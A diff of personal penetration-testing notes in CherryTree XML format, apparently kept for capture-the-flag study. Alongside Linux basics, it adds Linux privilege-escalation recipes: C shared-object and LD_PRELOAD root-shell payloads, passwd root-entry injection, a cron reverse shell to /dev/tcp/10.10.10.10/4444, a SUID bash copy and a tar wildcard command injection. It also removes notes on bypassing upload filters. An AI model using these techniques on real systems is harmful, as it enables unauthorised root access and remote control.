@@ -163,7 +163,7 @@ intitle:</rich_text>
       <rich_text link="webs https://en.wikipedia.org/wiki/Google_hacking">https://en.wikipedia.org/wiki/Google_hacking</rich_text>
     </node>
   </node>
-  <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="115" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699618949">
+  <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="115" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699882207">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 list in tree view
@@ -216,6 +216,12 @@ list installed packages:
 list available shells:
 </rich_text>
     <rich_text indent="1">cat /etc/shells</rich_text>
+    <rich_text>
+
+unzip .gz files
+</rich_text>
+    <rich_text indent="1">gunzip </rich_text>
+    <rich_text indent="1" weight="heavy">FILE</rich_text>
     <node name="User Management" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695158810" ts_lastsave="1699618791">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 New user:
@@ -331,8 +337,14 @@ List normal users/groups:
 </rich_text>
       <rich_text indent="2">getent group {1000..60000}</rich_text>
     </node>
-    <node name="Find" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1698759416" ts_lastsave="1699440269">
+    <node name="Find" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1698759416" ts_lastsave="1699887014">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Locate a file:
+</rich_text>
+      <rich_text indent="1">locate </rich_text>
+      <rich_text indent="1" weight="heavy">NAME</rich_text>
+      <rich_text>
+
 Search name case sensitive:
 </rich_text>
       <rich_text indent="1">find -name “</rich_text>
@@ -2358,22 +2370,18 @@ hydra -t </rich_text>
       <rich_text indent="1">://</rich_text>
       <rich_text indent="1" weight="heavy">IP</rich_text>
     </node>
-    <node name="Cracking" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357803" ts_lastsave="1699441276">
+    <node name="Cracking" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357803" ts_lastsave="1699881793">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Online cracking: </rich_text>
-      <rich_text indent="1" link="webs https://crackstation.net/">https://crackstation.net/</rich_text>
+Online cracking: https://crackstation.net/</rich_text>
       <rich_text indent="1">
 </rich_text>
       <rich_text>
-Online Hash Identifier: </rich_text>
-      <rich_text link="webs https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</rich_text>
-      <rich_text> 
+Online Hash Identifier: https://hashes.com/en/tools/hash_identifier 
 
 Offline Hash Identifier tool:
 </rich_text>
       <rich_text indent="1">wget </rich_text>
-      <rich_text indent="1" link="webs https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py">https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py</rich_text>
-      <rich_text>
+      <rich_text>https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
 </rich_text>
       <rich_text indent="1">python3 hash-id.py</rich_text>
       <rich_text>
@@ -2548,168 +2556,6 @@ Hashcat:
       <rich_text>
 </rich_text>
     </node>
-  </node>
-  <node name="Privilige Escalation" unique_id="99" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699550864" ts_lastsave="1699629914">
-    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-    <rich_text>
-Useful links:
-</rich_text>
-    <rich_text indent="1">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
-https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
-https://payatu.com/guide-linux-privilege-escalation</rich_text>
-    <rich_text>
-
-LinEnum:
-</rich_text>
-    <rich_text indent="1">wget </rich_text>
-    <rich_text indent="1" link="webs https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</rich_text>
-    <rich_text>
-
-Search for all SUID files:
-</rich_text>
-    <rich_text indent="1">find / -perm -u=s -type f 2&gt;/dev/null</rich_text>
-    <rich_text>
-execute file with SUID:</rich_text>
-    <rich_text indent="1">
-./</rich_text>
-    <rich_text indent="1" weight="heavy">FILE </rich_text>
-    <rich_text indent="1">-p</rich_text>
-    <rich_text>
-
-Write-able passwd file:
-</rich_text>
-    <rich_text indent="1">generate password hash:</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">openssl passwd -1 -salt </rich_text>
-    <rich_text indent="2" weight="heavy">SALT</rich_text>
-    <rich_text indent="2"> </rich_text>
-    <rich_text weight="heavy">PASSWORD</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">create newline in passwd file for root user:</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2" weight="heavy">USERNAME</rich_text>
-    <rich_text indent="2">:</rich_text>
-    <rich_text indent="2" weight="heavy">PASSWORD_HASH</rich_text>
-    <rich_text indent="2">:0:0:root:/root:/bin/bash</rich_text>
-    <rich_text>
-
-exploit binaries:
-</rich_text>
-    <rich_text indent="1">list commands user can run as root:</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">sudo -l</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">lookup the binary in: </rich_text>
-    <rich_text indent="1" link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">vi -&gt; sudo vi -c ':!/bin/sh' /dev/null</rich_text>
-    <rich_text>
-
-Crontab exploit:
-</rich_text>
-    <rich_text indent="1">cat /etc/crontab</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">look for scripts running as root</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">modify that script</rich_text>
-    <rich_text>
-
-PATH variable exploit:
-</rich_text>
-    <rich_text indent="1">Backup the original path</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">echo $PATH &gt; backup_path</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">identify a script running with root priviliges</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">identify which core commands it runs</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">cd /tmp</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">echo “/bin/bash” &gt; </rich_text>
-    <rich_text indent="1" weight="heavy">IMITATING_COMMAND</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">modify the path variable to the /tmp/ directory</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">export PATH=/tmp:$PATH</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">execute the script running with root priviliges</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">Reset</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">export PATH=</rich_text>
-    <rich_text indent="2" weight="heavy">ORIGINAL_PATH</rich_text>
-    <rich_text indent="2">:$PATH</rich_text>
-    <rich_text>
-
-
-</rich_text>
-  </node>
-  <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1699550888">
-    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-    <rich_text>
-basic ways to bypass client-side file upload filter:
-
-</rich_text>
-    <rich_text indent="1">Turn off Javascript in your browser
-Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter.
-Intercept and modify the valid dummy file upload. Change the MIME Type
-Send the file directly to the upload point. First intercept a successful upload to see the parameters being used in the upload</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">curl -X POST -F "submit:&lt;value&gt;" -F "&lt;file-parameter&gt;:@&lt;path-to-file&gt;" &lt;site&gt;</rich_text>
-    <rich_text>
-
-
-restrictions on downloading (/uploading) file because of extensions (</rich_text>
-    <rich_text weight="heavy">&lt; PHP 5.0</rich_text>
-    <rich_text>): 
-</rich_text>
-    <rich_text indent="1">Example</rich_text>
-    <rich_text>: trying to download package.json.bak → 403 error: only .md and .pdf files can be downloaded
-</rich_text>
-    <rich_text indent="1">Bypass: use Poisen Null Byte</rich_text>
-    <rich_text> (%00), URL ENCODED = %2500 → add %2500 at the end and also add one of the allowed extensions
-
-Basic server-side filter bypass 
-</rich_text>
-    <rich_text indent="1">if filtering "PHP" on just “.”</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">instead of .PHP use .php3, .php4, .php5, .php7, .phps, .php-s, .pht or .phar</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="1">Magic numbers</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">first add dummy characters to payload and then edit it in hexeditor</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text indent="2">see: </rich_text>
-    <rich_text>https://en.wikipedia.org/wiki/List_of_file_signatures
-
-
-
-</rich_text>
   </node>
   <node name="Access" unique_id="54" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696624665" ts_lastsave="1699551234">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
@@ -3359,104 +3205,380 @@ changing query parameter values</rich_text>
       </node>
     </node>
   </node>
-  <node name="Burp" unique_id="68" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697138374" ts_lastsave="1699287281">
+  <node name="Privilige Escalation" unique_id="99" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699550864" ts_lastsave="1699892768">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
-
+Useful links:
 </rich_text>
-    <node name="Basic info" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697139099" ts_lastsave="1699449925">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Tools:
+    <rich_text indent="1" link="webs https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</rich_text>
+    <rich_text indent="1"> 
 </rich_text>
-      <rich_text indent="1" weight="heavy">Proxy</rich_text>
-      <rich_text indent="1">: Intercept and modify requests/responses when interacting with web applications.
+    <rich_text indent="1" link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</rich_text>
+    <rich_text indent="1"> 
 </rich_text>
-      <rich_text indent="1" weight="heavy">Repeater</rich_text>
-      <rich_text indent="1">: Capture, modify, then resend the same request numerous times. 
+    <rich_text indent="1" link="webs https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html</rich_text>
+    <rich_text indent="1"> 
 </rich_text>
-      <rich_text indent="1" weight="heavy">Intruder</rich_text>
-      <rich_text indent="1">: Spray an endpoint with requests for bruteforce attacks or to fuzz endpoints.
-</rich_text>
-      <rich_text indent="1" weight="heavy">Decoder</rich_text>
-      <rich_text indent="1">: Decoding captured information, or encoding a payload prior to sending it to the target.
-</rich_text>
-      <rich_text indent="1" weight="heavy">Comparer</rich_text>
-      <rich_text indent="1">: Compare two pieces of data at either word or byte level.
-</rich_text>
-      <rich_text indent="1" weight="heavy">Sequencer</rich_text>
-      <rich_text indent="1">: Assess the randomness of tokens such as session cookie values or other supposedly random generated data. </rich_text>
-      <rich_text>
-
-Shortcuts:
-</rich_text>
-      <rich_text indent="1">Ctrl + Shift + D -&gt; Switch to the Dashboard
-Ctrl + Shift + T -&gt; Switch to the Target tab
-Ctrl + Shift + P -&gt; Switch to the Proxy tab
-Ctrl + Shift + I -&gt; Switch to the Intruder tab
-Ctrl + Shift + R -&gt; Switch to the Repeater tab</rich_text>
-      <rich_text>
-</rich_text>
-      <rich_text indent="1">Ctrl + U -&gt;</rich_text>
-      <rich_text>URL encode selected text
+    <rich_text indent="1" link="webs https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</rich_text>
+    <rich_text> 
 
 
-
+LinEnum:
 </rich_text>
-    </node>
-    <node name="Finetune" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697141883" ts_lastsave="1699449922">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-intercepting only relevant data:
-</rich_text>
-      <rich_text indent="1">go to target
-add to scope
-go to proxy setting
-adjust interception rule to include scope only</rich_text>
-    </node>
-  </node>
-  <node name="AAO" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699287281" ts_lastsave="1699550842">
-    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text indent="1">wget </rich_text>
+    <rich_text indent="1" link="webs https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</rich_text>
     <rich_text>
-Check available sudo commands:
+
+
+Exploit SUID/GUID:
 </rich_text>
-    <rich_text indent="1">sudo -l</rich_text>
-  </node>
-  <node name="Cryptography" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699366282" ts_lastsave="1699441549">
-    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text indent="1">Basic SUID/GUID exploit:</rich_text>
     <rich_text>
-Useful tools:
 </rich_text>
-    <rich_text indent="1" link="webs https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</rich_text>
+    <rich_text indent="2">Search for all SUID files:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">find / -perm -u=s -type f 2&gt;/dev/null</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">or</rich_text>
     <rich_text indent="1">
 </rich_text>
-    <rich_text indent="1" link="webs https://github.com/ius/rsatool">https://github.com/ius/rsatool</rich_text>
+    <rich_text indent="3">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">execute file with SUID:</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text indent="3">./</rich_text>
+    <rich_text indent="3" weight="heavy">FILE </rich_text>
+    <rich_text indent="3">-p</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">Shared Object Injection:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">run strace to detect missing or vulnerable objects</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">strace </rich_text>
+    <rich_text indent="3" weight="heavy">/SUID_COMMAND</rich_text>
+    <rich_text indent="3"> 2&gt;&amp;1 | grep -iE "open|access|no such file"</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Create the necessary directories to imitate the full path to the object</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Create a file called shell.c</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">#include &lt;stdio.h&gt;</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">#include &lt;stdlib.h&gt;</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="4">static void inject() __attribute__((constructor));</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="4">void inject() {</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="4">        setuid(0);</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="4">        system("/bin/bash -p");</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="4">}</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Create a shared object with the same name as</rich_text>
+    <rich_text> the missing object
+</rich_text>
+    <rich_text indent="3">gcc -shared -fPIC -o /</rich_text>
+    <rich_text indent="3" weight="heavy">IMITATED_PATH</rich_text>
+    <rich_text indent="3">/</rich_text>
+    <rich_text indent="3" weight="heavy">OBJECT_NAME</rich_text>
+    <rich_text indent="3">.so /</rich_text>
+    <rich_text indent="3" weight="heavy">PATH</rich_text>
+    <rich_text indent="3">/shell.c</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">run the program</rich_text>
     <rich_text>
 
-RSA:
+Write-able passwd file:
 </rich_text>
-    <rich_text indent="1">Key variables:
+    <rich_text indent="1">generate password hash:</rich_text>
+    <rich_text>
 </rich_text>
-    <rich_text indent="2">p: large primenr
-q: large primenr
-m: plaintext message
-n: p * q
-e: +n= public key
-d: +n= private key
-c</rich_text>
-    <rich_text>: ciphertext
+    <rich_text indent="2">openssl passwd -1 -salt </rich_text>
+    <rich_text indent="2" weight="heavy">SALT</rich_text>
+    <rich_text indent="2"> </rich_text>
+    <rich_text weight="heavy">PASSWORD</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">mkpasswd -m </rich_text>
+    <rich_text indent="2" weight="heavy">TYPE</rich_text>
+    <rich_text indent="2"> </rich_text>
+    <rich_text weight="heavy">PASSWORD</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">create newline in passwd file for root user:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2" weight="heavy">USERNAME</rich_text>
+    <rich_text indent="2">:</rich_text>
+    <rich_text indent="2" weight="heavy">PASSWORD_HASH</rich_text>
+    <rich_text indent="2">:0:0:root:/root:/bin/bash</rich_text>
+    <rich_text>
 
-GPG:
+
+exploit binaries:
 </rich_text>
-    <rich_text indent="1">gpg --import</rich_text>
-    <rich_text indent="1" weight="heavy"> GPG_KEY_FILE</rich_text>
+    <rich_text indent="1">list commands user can run as root:</rich_text>
     <rich_text>
 </rich_text>
-    <rich_text indent="1">gpg </rich_text>
-    <rich_text indent="1" weight="heavy">ENCRYPTED_FILE</rich_text>
+    <rich_text indent="2">sudo -l</rich_text>
     <rich_text>
 </rich_text>
-    <rich_text indent="1">New file will be created with the plaintext</rich_text>
+    <rich_text indent="1">lookup the binary in: </rich_text>
+    <rich_text indent="1" link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">vi -&gt; sudo vi -c ':!/bin/sh' /dev/null</rich_text>
+    <rich_text>
+
+
+PATH variable exploit:
+</rich_text>
+    <rich_text indent="1">Backup the original path</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">echo $PATH &gt; original_path</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">identify a program/file runnable with root priviliges</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">identify which core commands it runs</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">strings </rich_text>
+    <rich_text weight="heavy">COMMAND</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">cat/nano/less/head/....</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">create imitating escalation script:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">echo “/bin/bash” &gt; </rich_text>
+    <rich_text indent="2" weight="heavy">IMITATING_COMMAND</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">modify the path variable to the directory</rich_text>
+    <rich_text> of the imitating script
+</rich_text>
+    <rich_text indent="2">PATH=.:/</rich_text>
+    <rich_text weight="heavy">PATH_TO_SCRIPT</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">or</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">export PATH=/</rich_text>
+    <rich_text indent="2" weight="heavy">PATH_TO_SCRIPT</rich_text>
+    <rich_text indent="2">:$PATH</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">execute the program/file running with root priviliges</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">resetting</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">export PATH=</rich_text>
+    <rich_text indent="2" weight="heavy">ORIGINAL_PATH</rich_text>
+    <rich_text indent="2">:$PATH</rich_text>
+    <rich_text>
+
+
+Environment variables exploit:
+</rich_text>
+    <rich_text indent="1">*** </rich_text>
+    <rich_text indent="1" weight="heavy">PATH</rich_text>
+    <rich_text indent="1"> needs to be full path!</rich_text>
+    <rich_text> ***
+</rich_text>
+    <rich_text indent="1">look if LD_PRELOAD or LD_LIBRARY_PATH is present in the env_keep</rich_text>
+    <rich_text>:
+</rich_text>
+    <rich_text indent="2">sudo -l</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">exploit LD_PRELOAD:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Create preload.c file:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setresuid(0,0,0);
+  system("/bin/bash -p");
+}</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Create a shared object</rich_text>
+    <rich_text> with the preload.c file:
+</rich_text>
+    <rich_text indent="3">gcc -fPIC -shared -nostartfiles -o</rich_text>
+    <rich_text> </rich_text>
+    <rich_text weight="heavy">/PATH/SHARED_OBJECT</rich_text>
+    <rich_text>.so </rich_text>
+    <rich_text weight="heavy">/PATH/</rich_text>
+    <rich_text>preload.c
+</rich_text>
+    <rich_text indent="2">Run a program you are allowed to run via sudo with the new shared object:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">sudo LD_PRELOAD=</rich_text>
+    <rich_text indent="3" weight="heavy">/PATH/SHARED_OBJECT</rich_text>
+    <rich_text indent="3">.so </rich_text>
+    <rich_text weight="heavy">PROGRAM</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">exploit</rich_text>
+    <rich_text> LD_LIBRARY_PATH:
+</rich_text>
+    <rich_text indent="2">Create library_path.c file:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">identify shared libraries of a program you can run with sudo:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">ldd </rich_text>
+    <rich_text indent="3" weight="heavy">PROGRAM</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Create a shared object with the same name as one of the libraries</rich_text>
+    <rich_text> with the library_path.c file:
+</rich_text>
+    <rich_text indent="3">gcc -o </rich_text>
+    <rich_text indent="3" weight="heavy">/PATH/LIBRARY_NAME</rich_text>
+    <rich_text indent="3"> -shared -fPIC </rich_text>
+    <rich_text indent="3" weight="heavy">/PATH</rich_text>
+    <rich_text indent="3">/library_path.c</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Run the program with the new object</rich_text>
+    <rich_text>:
+</rich_text>
+    <rich_text indent="3">sudo LD_LIBRARY_PATH=</rich_text>
+    <rich_text indent="3" weight="heavy">/PATH/DIRECTORY_CONTAINING_OBJECT</rich_text>
+    <rich_text indent="3"> </rich_text>
+    <rich_text weight="heavy">PROGRAM</rich_text>
+    <rich_text>
+
+Cronjobs exploit:
+</rich_text>
+    <rich_text indent="1">view system-wide crontab:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">cat /etc/crontab</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">look for scripts running as root</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">script modification exploit:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">modify that script</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">replace code with reverse shell</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">#!/bin/bash</rich_text>
+    <rich_text indent="2">
+</rich_text>
+    <rich_text indent="3">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">PATH variable exploit:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">lookup the PATH variable</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">create an EXECUTABLE file with the same filename as one of the cronjobs in that directory</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">#!/bin/bash</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">cp /bin/bash /tmp/rootbash</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">chmod +xs /tmp/rootbash</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">wait until the job runs and executes the malicious file</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">run the newly created file with -p</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">TAR Wildcard exploits:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">identify script with TAR command using wildcards
+create a reverse shell executable
+place file in the directory included in the wildcard of the TAR command
+run following commands in the same place:
+</rich_text>
+    <rich_text indent="3">touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=</rich_text>
+    <rich_text indent="3" weight="heavy">REVERSE_SHELL_EXECUTABLE</rich_text>
+    <rich_text>
+
+
+Command history snooping:
+</rich_text>
+    <rich_text indent="1">view all histry files:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">cat ~/.*history | less</rich_text>
+    <rich_text>
+
+
+Kernel exploits:
+</rich_text>
+    <rich_text indent="1">Use tool to identify possible exploits:
+</rich_text>
+    <rich_text indent="2">perl linux-exploit-suggester-2.pl</rich_text>
   </node>
-  <node name="Web Exploitation basic method" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="31" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1699274102">
+  <node name="Web Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="35" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1699869509">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 UPLOAD EXPLOITATION:
@@ -3523,16 +3645,153 @@ UPLOAD EXPLOITATION:
     <rich_text>filtering based on MIME types.
 </rich_text>
     <rich_text indent="2">Enumerate file length filters with the legitimate file. </rich_text>
+    <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1699869498">
